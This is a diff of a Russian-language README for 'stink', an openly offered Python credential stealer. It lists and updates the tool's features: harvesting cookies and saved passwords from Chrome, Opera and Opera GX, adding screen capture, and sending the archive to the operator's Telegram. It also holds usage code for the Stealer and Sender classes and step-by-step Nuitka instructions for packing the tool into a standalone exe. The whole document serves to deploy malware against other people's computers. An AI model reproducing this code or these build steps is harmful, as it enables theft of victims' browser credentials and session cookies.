@@ -19,13 +19,13 @@
   * [Получение айди](#Получение-айди)
 * [Создание exe](#Создание-exe)
   * [Создание исполняемого файла](#Создание-исполняемого-файла)
-  * [PyCharm](#PyCharm)
   * [CMD](#CMD)
 
 ### Текущие возможности
 1. Сбор куки и паролей следующих браузеров: Chrome, Opera, Opera GX.
 2. Отправка собранных данных архивом в Telegram.
 3. Выполнение в отдельном потоке.
+4. Скриншот экрана.
 
 ### Будущие возможности
 1. Поддержка других браузеров.
@@ -36,7 +36,7 @@
 
 Установить последнюю версию можно командой:
 ```
-pip install stink==0.0.3
+pip install stink==0.0.4
 ```
 
 ## Пример использования
@@ -46,11 +46,13 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
+Для включения вывода ошибок добавьте параметр `errors_print=True`.
+
 Стандартный ```Stealer``` запускает сбор по всем доступным браузерам и отправляет собранные данные архивом вам в Telegram.
 
 ### Кастомный
 ```python
-from os import path, mkdir
+from os import mkdir
 from getpass import getuser
 
 from stink.browsers.chrome import Chrome
@@ -67,8 +69,8 @@ def main():
 
     mkdir(storage_path + storage_folder)
 
-    Chrome(storage_path, storage_folder).run()
-    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID).run()
+    Chrome(storage_path, storage_folder, False).run()
+    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID, False).run()
 
 
 if __name__ == "__main__":
@@ -122,20 +124,6 @@ from stink.multistealer import Stealer
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
-### PyCharm
-1. Открываем терминал.
-2. Устанавливаем Nuitka и Stink:
-```
-pip install Nuitka==0.6.16.4
-```
-```
-pip install stink==0.0.3
-```
-3. Прописываем команду:
-```
-nuitka --onefile --include-package=stink test.py
-```
-
 ### CMD
 1. Открываем `cmd`.
 2. Прописываем команду:
@@ -158,7 +146,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.3
+pip install stink==0.0.4
 ```
 6. В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`.
 7. Копируем файл `win32crypt.pyd`.
